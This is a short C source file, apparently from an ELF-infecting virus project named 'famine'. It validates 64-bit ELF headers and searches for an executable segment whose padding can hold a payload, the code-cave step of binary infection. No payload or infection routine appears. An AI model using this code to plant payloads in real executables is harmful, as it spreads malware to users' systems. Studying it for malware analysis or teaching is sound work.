//
// Created by tblaudez on 1/14/22.
//

#include <stdbool.h>
#include <elf.h>
#include <stddef.h>
#include <sys/syscall.h>
#include "famine.h"

bool isValidElf64(const Elf64_Ehdr *ehdr) {
	return ehdr->e_ident[EI_ABIVERSION] == 0 && \
        (ehdr->e_ident[EI_OSABI] == ELFOSABI_SYSV || ehdr->e_ident[EI_OSABI] == ELFOSABI_GNU) && \
        ehdr->e_ident[EI_CLASS] == ELFCLASS64 && \
        (ehdr->e_type == ET_DYN || ehdr->e_type == ET_EXEC);
}

Elf64_Phdr *findUsableSegment(Elf64_Phdr *phdr, Elf64_Half e_phnum) {
	for (int i = 0; i < e_phnum - 1; i++) {
		if (phdr[i].p_flags & PF_X && \
            (int) (phdr[i + 1].p_offset - (phdr[i].p_offset + phdr[i].p_filesz)) > PAYLOAD_SIZE) {
			return &phdr[i];
		}
	}
	return NULL;
}